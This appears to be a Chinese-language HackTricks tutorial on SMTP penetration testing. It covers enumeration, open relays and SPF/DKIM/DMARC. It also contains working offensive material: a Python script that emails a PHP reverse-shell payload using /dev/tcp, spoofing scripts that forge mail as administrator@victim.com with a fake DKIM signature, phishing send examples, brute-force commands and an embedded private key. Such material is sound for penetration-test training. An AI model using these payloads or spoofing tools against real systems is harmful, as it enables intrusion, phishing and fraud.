# 25,465,587 - SMTP渗透测试

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**即时可用的漏洞评估和渗透测试设置**。从任何地方运行完整的渗透测试，拥有20多个工具和功能，从侦察到报告。我们不替代渗透测试人员 - 我们开发定制工具、检测和利用模块，以便他们有更多时间深入挖掘、弹出shell，并享受乐趣。

{% embed url="https://pentest-tools.com/" %}

## **基本信息**

**SMTP（简单邮件传输协议）**是一个用于**发送**和接收**电子邮件**的TCP/IP协议。然而，由于它在接收端排队消息的能力有限，通常与另外两个协议之一POP3或IMAP一起使用，这两个协议允许用户在服务器邮箱中保存消息，并定期从服务器下载。

换句话说，**用户通常使用**一个使用**SMTP发送电子邮件**和使用**POP3或IMAP接收**电子邮件的程序。在基于Unix的系统上，**sendmail**是最广泛使用的用于电子邮件的SMTP服务器。商业软件包Sendmail包括一个POP3服务器。**Microsoft Exchange**包括一个SMTP服务器，并且也可以设置为包括POP3支持。
来自[这里](https://whatis.techtarget.com/definition/SMTP-Simple-Mail-Transfer-Protocol)。

**默认端口：** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### 电子邮件头部

如果你有机会**让受害者发送电子邮件给你**（例如通过网页的联系表单），那么就这么做，因为通过查看邮件的头部信息，**你可以了解到受害者内部的拓扑结构**。

你也可以通过尝试**向SMTP服务器发送一封发往不存在地址的电子邮件**来获取一封电子邮件（因为服务器会向攻击者发送一封NDN邮件）。但是，请确保你从允许的地址发送邮件（检查SPF策略），并且你能接收NDN消息。

你还应该尝试**发送不同内容的邮件，因为你可能会在头部信息中找到更多有趣的信息**，例如：`X-Virus-Scanned: by av.domain.com`\
你应该发送EICAR测试文件。\
检测到**杀毒软件（AV）**可能允许你利用**已知的漏洞。**

## 基本操作

### **横幅抓取/基本连接**

**SMTP：**
```bash
nc -vn <IP> 25
```
**SMTPS**：
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### 查找组织的MX服务器
```bash
dig +short mx google.com
```
### 枚举
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM 认证 - 信息泄露

如果服务器支持 NTLM 认证（Windows），您可以获取敏感信息（版本）。更多信息请点击[**这里**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666)。
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
Or **automate** this with **nmap** plugin `smtp-ntlm-info.nse`

### 内部服务器名称 - 信息泄露

当命令 "MAIL FROM" 发出而没有完整地址时，一些SMTP服务器会自动完成发件人地址，泄露其内部名称：
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### 嗅探

检查是否能从发送到25端口的数据包中嗅探到某些密码

### [Auth bruteforce](../../generic-methodologies-and-resources/brute-force.md#smtp)

## 用户名暴力破解枚举

**并非总是需要认证**

### RCPT TO
```bash
$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
MAIL FROM:test@test.org
250 2.1.0 test@test.org... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY

VRFY命令用于验证邮箱地址的有效性。通过向SMTP服务器发送VRFY命令，攻击者可以确认单个用户是否存在。如果服务器配置不当，这可能会泄露用户信息。
```
$ telnet 10.0.0.1 25
Trying 10.0.0.1...
Connected to 10.0.0.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
VRFY root
250 Super-User <root@myhost>
VRFY blah
550 blah... User unknown
```
### EXPN
```
$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 <ed.williams@myhost>
EXPN sshd
250 2.1.5 sshd privsep <sshd@mail2>
```
### 自动工具
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**即时可用的漏洞评估与渗透测试设置**。从任何地方运行完整的渗透测试，拥有20多个从侦察到报告的工具和功能。我们不替代渗透测试人员 - 我们开发定制工具、检测和利用模块，以便他们有更多时间深入挖掘、弹出shell，并享受乐趣。

{% embed url="https://pentest-tools.com/" %}

## DSN 报告

**递送状态通知报告**：如果您向组织发送**电子邮件**至一个**无效地址**，组织会通过发送**邮件回复您**来通知该地址无效。被返回电子邮件的**头部信息**将**包含**可能的**敏感信息**（如与报告互动的邮件服务的IP地址或防病毒软件信息）。

## [命令](smtp-commands.md)

### 从Linux控制台发送电子邮件
```
root@kali:~# sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

IT Dept,

We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.

Sincerely,
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### 使用Python发送电子邮件

以下是使用python脚本发送电子邮件的另一种方法
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
## 邮件伪造

本节内容主要摘自 **网络安全评估 第三版** 一书。

SMTP 消息很容易被伪造，因此组织使用 **SPF**、**DKIM** 和 **DMARC** 功能来防止未经授权的方发送电子邮件。

**这些防范措施的完整指南** 可以在 [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/) 找到。

### SPF

{% hint style="danger" %}
SPF [在 2014 年被“弃用”](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/)。这意味着您不是在 `_spf.domain.com` 创建 **TXT 记录**，而是使用**相同语法**在 `domain.com` 创建它。\
此外，为了重用以前的 spf 记录，通常会发现类似 `"v=spf1 include:_spf.google.com ~all"` 的内容。
{% endhint %}

**发件人策略框架**（SPF）提供了一种机制，允许邮件传输代理（MTA）检查发送电子邮件的主机是否获得授权。\
然后，组织可以定义授权邮件服务器的列表，MTA 可以查询这些列表，以检查电子邮件是否被伪造。\
为了定义**被允许代表域名发送电子邮件的 IP 地址/范围、域名等**，SPF 记录中可以出现不同的“**机制**”。

#### 机制

| 机制      | 描述                                                                                                                                                                                                                                                                                                                         |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | 总是匹配；用于默认结果，如 `-all` 表示所有未被前面机制匹配的 IP。                                                                                                                                                                                                                                                           |
| A         | 如果域名有一个地址记录（A 或 AAAA）可以解析为发件人的地址，它将匹配。                                                                                                                                                                                                                                                       |
| IP4       | 如果发件人位于给定的 IPv4 地址范围内，匹配。                                                                                                                                                                                                                                                                               |
| IP6       | 如果发件人位于给定的 IPv6 地址范围内，匹配。                                                                                                                                                                                                                                                                               |
| MX        | 如果域名有一个 MX 记录解析为发件人的地址，它将匹配（即邮件来自域的入站邮件服务器之一）。                                                                                                                                                                                                                                   |
| PTR       | 如果客户端地址的域名（PTR 记录）在给定域中，并且该域名解析为客户端地址（正向确认的反向 DNS），则匹配。这种机制不鼓励使用，应尽可能避免。                                                                                                                                                                                 |
| EXISTS    | 如果给定的域名解析为任何地址，则匹配（无论它解析为哪个地址）。这很少使用。与 SPF 宏语言一起，它提供了更复杂的匹配，如 DNSBL 查询。                                                                                                                                                                                       |
| INCLUDE   | 引用另一个域的策略。如果该域的策略通过，此机制通过。然而，如果包含的策略失败，处理将继续。要完全委托给另一个域的策略，必须使用 redirect 扩展。                                                                                                                                                                         |
| REDIRECT  | <p>重定向是指向托管 SPF 策略的另一个域名的指针，它允许多个域共享相同的 SPF 策略。当与共享相同电子邮件基础设施的大量域合作时，这很有用。</p><p>将使用重定向机制中指示的域的 SPF 策略。</p>                                                                                                                             |

还可以识别表明**如果匹配了机制应该做什么**的**限定符**。默认情况下，使用**限定符 "+"**（所以如果任何机制匹配，那意味着它是被允许的）。\
您通常会在每个 SPF 策略的**末尾**注意到类似：**\~all** 或 **-all**。这用于指示**如果发件人不匹配任何 SPF 策略，您应该将电子邮件标记为不受信任 (\~) 或拒绝 (-) 电子邮件。**

#### 限定符

每个机制都可以与四个限定符之一结合使用：

* **`+`** 表示通过结果。这可以省略；例如，`+mx` 与 `mx` 相同。
* **`?`** 表示中性结果，解释为无（无策略）。
* **`~`** （波浪号）表示 SOFTFAIL，是中性和失败之间的调试辅助。通常，返回 SOFTFAIL 的消息被接受但标记。
* **`-`** （减号）表示失败，邮件应该被拒绝（见下文）。

在以下示例中，您可以阅读 **google.com 的 SPF 策略**。注意**第一个 SPF 策略是如何包含其他域的 SPF 策略：**
```shell-session
kali@kali:~$ dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

kali@kali:~$ dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

kali@kali:~$ dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

kali@kali:~$ dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

kali@kali:~$ dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
传统上，任何没有正确/任何SPF记录的域名都可以被伪造。**现在**，如果**电子邮件**来自**没有有效SPF记录的域**，很可能会被**自动拒绝/标记为不受信任**。

要检查域的SPF，您可以使用在线工具，例如：[https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM

DomainKeys Identified Mail (DKIM) 是一种机制，通过该机制**外发电子邮件被签名，并在通过DNS检索域的公钥时由外部MTA验证**。DKIM公钥保存在域的TXT记录中；然而，您必须知道选择器和域名才能检索它。

然后，要请求密钥，您需要邮件头部的`DKIM-Signature`中的域名和选择器，例如：`d=gmail.com;s=20120113`
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCg
KCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC

基于域的消息认证、报告与合规（DMARC）是一种邮件认证方法，它在SPF和DKIM的基础上进行了扩展。策略指导邮件服务器如何处理给定域的电子邮件，并报告执行的操作。

![](<../../.gitbook/assets/image (134).png>)

**要获取DMARC记录，您需要查询子域 \_dmarc**
```shell-session
root@kali:~# dig _dmarc.yahoo.com txt | grep DMARC
_dmarc.yahoo.com.  1785 IN TXT "v=DMARC1\; p=reject\; sp=none\; pct=100\;
rua=mailto:dmarc-yahoo-rua@yahoo-inc.com, mailto:dmarc_y_rua@yahoo.com\;"

root@kali:~# dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com. 600 IN TXT "v=DMARC1\; p=quarantine\; rua=mailto:mailauth-reports@google.com"

root@kali:~# dig _dmarc.paypal.com txt | grep DMARC
_dmarc.paypal.com. 300 IN TXT "v=DMARC1\; p=reject\; rua=mailto:d@rua.agari.com\;
ruf=mailto:dk@bounce.paypal.com,mailto:d@ruf.agari.com"
```
#### DMARC 标签

| 标签名称 | 目的                                           | 示例                            |
| -------- | --------------------------------------------- | ------------------------------- |
| v        | 协议版本                                      | v=DMARC1                        |
| pct      | 受过滤的消息百分比                             | pct=20                          |
| ruf      | 法医报告的报告 URI                            | ruf=mailto:authfail@example.com |
| rua      | 聚合报告的报告 URI                            | rua=mailto:aggrep@example.com   |
| p        | 组织域的策略                                   | p=quarantine                    |
| sp       | OD 子域的策略                                  | sp=reject                       |
| adkim    | DKIM 的对齐模式                                | adkim=s                         |
| aspf     | SPF 的对齐模式                                 | aspf=r                          |

### **子域名怎么办？**

**来自** [**这里**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**。**\
您需要为每个您希望发送邮件的子域名设置单独的 SPF 记录。\
以下内容最初发布在 openspf.org，这是一个关于此类信息的极佳资源。

> 恶魔问题：子域名怎么办？
>
> 如果我收到来自 pielovers.demon.co.uk 的邮件，而 pielovers 没有 SPF 数据，我应该回退一级并测试 demon.co.uk 的 SPF 吗？不。Demon 的每个子域名是不同的客户，每个客户可能有自己的策略。让 Demon 的策略默认适用于所有客户是没有意义的；如果 Demon 想要这样做，它可以为每个子域名设置 SPF 记录。
>
> 因此，给 SPF 发布者的建议是：您应该为每个具有 A 或 MX 记录的子域名或主机名添加 SPF 记录。
>
> 具有通配符 A 或 MX 记录的网站也应该有一个通配符 SPF 记录，格式为：\* IN TXT "v=spf1 -all"

这是有道理的 - 一个子域名很可能位于不同的地理位置，并且有一个非常不同的 SPF 定义。

### **开放中继**

为了防止发送的电子邮件被垃圾邮件过滤器过滤而无法到达收件人，发件人可以使用**收件人信任的中继服务器**。通常，管理员**没有概览**哪些**IP**范围他们必须**允许**。这导致 SMTP 服务器的配置错误，我们在外部和内部渗透测试中仍然经常发现这种情况。因此，他们**允许所有 IP 地址**以避免在电子邮件通信中出现错误，从而不扰乱或无意中中断与潜在和现有客户的沟通：
```shell-session
mynetworks = 0.0.0.0/0
```

```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **工具**

* [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **检查 SPF 和 DMARC 配置错误**
* [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **自动获取 SPF 和 DMARC 配置**

### 发送伪造电子邮件

* [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
* [**http://www.anonymailer.net/**](http://www.anonymailer.net)
* [**https://emkei.cz/**](https://emkei.cz/)****

**或者您可以使用工具：**

* [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)****
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
{% hint style="warning" %}
如果在使用 dkim python 库解析密钥时遇到任何**错误**，可以随意使用以下这个方法。\
**注意**：这只是一个快速检查的临时解决办法，用在某些原因导致 openssl 私钥**无法被 dkim 解析**的情况。
```
-----BEGIN RSA PRIVATE KEY-----
MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
-----END RSA PRIVATE KEY-----
```
{% endhint %}

**或者你可以手动进行：**

{% tabs %}
{% tab title="PHP" %}
<pre class="language-php"><code class="lang-php"><strong># 这将发送一个未签名的消息
</strong><strong>mail("your_email@gmail.com", "测试主题！", "嘿！这是一个测试", "来自：administrator@victim.com");
</strong></code></pre>
{% endtab %}

{% tab title="Python" %}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{% endtab %}
{% endtabs %}

### **更多信息**

**在此找到更多关于这些保护措施的信息** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **其他钓鱼指标**

* 域名的年龄
* 指向IP地址的链接
* 链接操纵技术
* 可疑（不常见）附件
* 破损的电子邮件内容
* 使用的值与邮件头部的值不同
* 存在有效且受信任的SSL证书
* 将页面提交到网页内容过滤站点

## 通过SMTP泄露数据

**如果您可以通过SMTP发送数据** [**阅读此内容**](../../generic-methodologies-and-resources/exfiltration.md#smtp)**。**

## 配置文件

### Postfix

通常，如果安装了，在`/etc/postfix/master.cf`中包含**执行脚本**，例如当用户接收到新邮件时。例如，行`flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}`意味着如果用户mark接收到新邮件，`/etc/postfix/filtering`将会被执行。

其他配置文件：
```
sendmail.cf
submit.cf
```
## HackTricks 自动命令
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
```markdown
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**即刻可用的漏洞评估与渗透测试设置**。使用20多个工具和功能从侦察到报告执行完整的渗透测试。我们不替代渗透测试人员 - 我们开发定制工具、检测和利用模块，以便让他们有更多时间深入挖掘、弹出shell，并享受乐趣。

{% embed url="https://pentest-tools.com/" %}
<details>

<summary><strong>从零开始学习AWS黑客技术，成为英雄级人物，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
```
